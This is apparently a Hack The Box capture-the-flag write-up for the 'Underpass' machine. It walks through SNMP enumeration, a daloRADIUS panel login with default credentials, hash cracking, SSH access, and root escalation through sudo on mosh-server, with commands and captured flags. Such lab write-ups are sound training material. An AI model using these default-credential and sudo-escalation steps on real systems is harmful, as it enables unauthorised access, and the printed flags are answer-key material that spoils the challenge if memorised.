---
layout: single
title: HTB - Underpass
excerpt: "Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine with UDP ports for alternative attack vector, The attacker can enumerate SNMP and discover that `Daloradius` is running on the remote machine, and the operators panel can be accessed using the default credentials." 
date: 2025-05-17
classes: wide
header:
  teaser: /assets/images/img-underpass/portada.png
  teaser_home_page: true
  icon: /assets/images/
categories:
  - CTF
  - Web
tags:
  - Hack the box
  - Linux
  - snmp
  - Daloradius
---

Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine using UDP ports for alternative attack vectors. The attacker can enumerate SNMP and discover that `Daloradius` is running on the remote machine, and the operators panel can be accessed using the default credentials. Inside the panel, the password hash for the user `svcMosh` is stored, and it's crackable. Then, the attacker can log in to the remote machine using SSH with the credentials they have obtained.

The user `svcMosh` is configured to run `mosdh-server` as `root`, which allows the attacker to connect to the server from their local machine and interact with the remote machine as the `root` user.

<p align = "center">
<img src = "/assets/images/img-underpass/portada.png">
</p>

## Machine matrix

<p align = "center">
<img src = "/assets/images/img-underpass/matrix.png">
</p>

## Scanning

```python
root@tornado:/home/h4nger/htb/uderpass# nmap -sS --min-rate=5000 -n -Pn -vvv 10.10.11.48 -oN scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 17:27 EDT
Initiating SYN Stealth Scan at 17:27
Scanning 10.10.11.48 [1000 ports]
Discovered open port 22/tcp on 10.10.11.48
Discovered open port 80/tcp on 10.10.11.48
Completed SYN Stealth Scan at 17:27, 0.25s elapsed (1000 total ports)
Nmap scan report for 10.10.11.48
Host is up, received user-set (0.044s latency).
Scanned at 2025-05-11 17:27:06 EDT for 0s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)
```

```python
root@tornado:/home/h4nger/htb/uderpass# nmap -sVC -p22,80 10.10.11.48 -oN portscan               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 17:29 EDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:29 (0:00:06 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
```

Default apache page:

<p align = "center">
<img src = "/assets/images/img-underpass/img1.png">
</p>

Fuzzing the web page didn't find any interesting path.

```
root@tornado:/home/h4nger/htb/uderpass/nmap# gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                              
===============================================================                                                                                                                              
Gobuster v3.6                                                                                                                                                                                
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                
===============================================================                                                                                                                              
[+] Url:                     http://10.10.11.48 
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode 
===============================================================
/server-status        (Status: 403) [Size: 276]
Progress: 96392 / 220561 (43.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 96429 / 220561 (43.72%)
===============================================================
```
We can see the snmp port is open in this machine.

```python
root@tornado:/home/h4nger/htb/uderpass/nmap# nmap -p161 -sU 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 17:44 EDT
Nmap scan report for 10.10.11.48
Host is up (0.066s latency).

PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
root@tornado:/home/h4nger/htb/uderpass/nmap#

```

## Recon using snmp

Using snmpwalk with the public community we can see interesting info about the machine:

- Kernal version that is using.
- a user mail ***"steve@uderpass.htb"***.
- a domain name ***"Underpass.htb"***.
- And the machine it's using ***daloradius***.

```
root@tornado:/home/h4nger/htb/uderpass/nmap# snmpwalk -c public -v2c 10.10.11.48                                                                                                             
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"                                                                        
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10                                                                                                                                         
iso.3.6.1.2.1.1.3.0 = Timeticks: (11274768) 1 day, 7:19:07.68                                                                                                                                
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"                                                                                                                                          
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"                                                                                                    
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"                                                                                                                                 
iso.3.6.1.2.1.1.7.0 = INTEGER: 72                                                                                                                                                            
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1                                                                                                                                               
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50                                                                                                                                              
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4                                                                                                                                               
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3                                                                                                                                        
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
```

Editing the hosts file to put the domain ***uderpass.htb*** there was no difference notice accessing the web page.

<p align = "center">
<img src = "/assets/images/img-underpass/img2.png">
</p>

If we want to get more information from the victim machine through snmp we can use ***MIBs***.

So first we need to install it:

```
root@tornado:/home/h4nger/htb/uderpass/nmap# apt install snmp-mibs-downloader 
The following packages were automatically installed and are no longer required:
  libdnnl3  libmsgpack-c2  libtree-sitter0.22  libunibilium4  libvterm0  libxnnpack0  lua-lpeg  lua-luv  neovim-runtime  python3-pynvim
Use 'sudo apt autoremove' to remove them.

Installing:
  snmp-mibs-downloader

Installing dependencies:
  smistrip

Summary:
  Upgrading: 0, Installing: 2, Removing: 0, Not Upgrading: 1173
  Download size: 5,882 kB
  Space needed: 6,137 kB / 62.1 GB available

Continue? [Y/n] 
```

Then we need to uncomment the following line on the ***snmp.conf*** file:

<p align = "center">
<img src = "/assets/images/img-underpass/img3.png">
</p>


And using the parameter ***-m all*** we can see more information about the victim machine.

```
root@tornado:/home/h4nger/htb/uderpass/nmap# snmpwalk -c public -v2c -m all 10.10.11.48 2>&/dev/null                                                                                         
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64                                                                       
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-TC::linux                                                                                                                                          
DISMAN-EXPRESSION-MIB::sysUpTimeInstance = Timeticks: (11388311) 1 day, 7:38:03.11                                                                                                           
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb                                                                                                                                       
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!                                                                                                    
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas                                                                                                                             
SNMPv2-MIB::sysServices.0 = INTEGER: 72                                                                                                                                                      
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: RFC1213-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (11389479) 1 day, 7:38:14.79
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2025-5-11,22:6:8.0,+0:0
```

## Exploitation

Previously we saw that the machine is hosting a ***daloradius*** service, And we can see on the web page it's giving us ***forbidden***.

<p align = "center">
<img src = "/assets/images/img-underpass/img4.png">
</p>

Fuzzing in that path we can see some others paths:

```
root@tornado:/home/h4nger/htb/uderpass/nmap# gobuster dir -u http://10.10.11.48/daloradius/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/library              (Status: 301) [Size: 323] [--> http://10.10.11.48/daloradius/library/]
/doc                  (Status: 301) [Size: 319] [--> http://10.10.11.48/daloradius/doc/]
/app                  (Status: 301) [Size: 319] [--> http://10.10.11.48/daloradius/app/]
/contrib              (Status: 301) [Size: 323] [--> http://10.10.11.48/daloradius/contrib/]
/ChangeLog            (Status: 200) [Size: 24703]
/setup                (Status: 301) [Size: 321] [--> http://10.10.11.48/daloradius/setup/]
/LICENSE              (Status: 200) [Size: 18011]
Progress: 21092 / 220561 (9.56%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 21111 / 220561 (9.57%)
===============================================================
Finished
===============================================================
```
Searching for some information about this service I found a github **[repository](https://github.com/lirantal/daloradius)** where is structured the files and directories of this service.

So there are two login pages the first one ***/app/users*** using the default credentials did not work.

<p align = "center">
<img src = "/assets/images/img-underpass/img5.png">
</p>

But the second login wich is the ***/app/operators*** using the default daloradius credencials works ***(administrator:radius)***.

<p align = "center">
<img src = "/assets/images/img-underpass/img6.png">
</p>

We see that there is a user created named ***svcMosh*** and that the password is hashed.

<p align = "center">
<img src = "/assets/images/img-underpass/img7.png">
</p>

By cracking the hash from **[crackstation](https://crackstation.net/)** we can see the user's password in clear text.

<p align = "center">
<img src = "/assets/images/img-underpass/img8.png">
</p>

During the scanning phase we saw that the machine that the port 22 is open.

So by using these credentials we have access to the victim machine through ssh.

```
root@tornado:/home/h4nger/htb/uderpass/nmap# ssh svcMosh@10.10.11.48                                
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ED25519) to the list of known hosts.
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 11 10:36:11 PM UTC 2025

  System load:  0.0               Processes:             227
  Usage of /:   71.7% of 6.56GB   Users logged in:       1
  Memory usage: 33%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 11 19:04:09 2025 from 10.10.14.186
svcMosh@underpass:~$
```

We found the fisrt flag to submit on htb:

```
svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt 
8bc994f8799fc71ead820322425fc6ee
svcMosh@underpass:~$
```
## PrivEsc

The user svcMosh have sudo permissions on the binary mosh-server

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$
```
Doing some research I found the following **[website](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html)** where it explains how to exploit this binary to access as root if we have SUID permissions.

So using the following command i gain access to the root user --> ***mosh --server="sudo /usr/bin/mosh-server" localhost***.

<p align = "center">
<img src = "/assets/images/img-underpass/img9.png">
</p>

Another wey to gain root access is using the commando ***sudo mosh-server*** and it will generate a temporal key, then with that key using the command ***mosh-client*** we have root access.

<p align = "center">
<img src = "/assets/images/img-underpass/img10.png">
</p>

<p align = "center">
<img src = "/assets/images/img-underpass/img11.png">
</p>

And now we can submit the last flag.

```
root@underpass:~# cat root.txt 
08d1c61bb03603f3e3d1a012759d626c
root@underpass:~# 
```
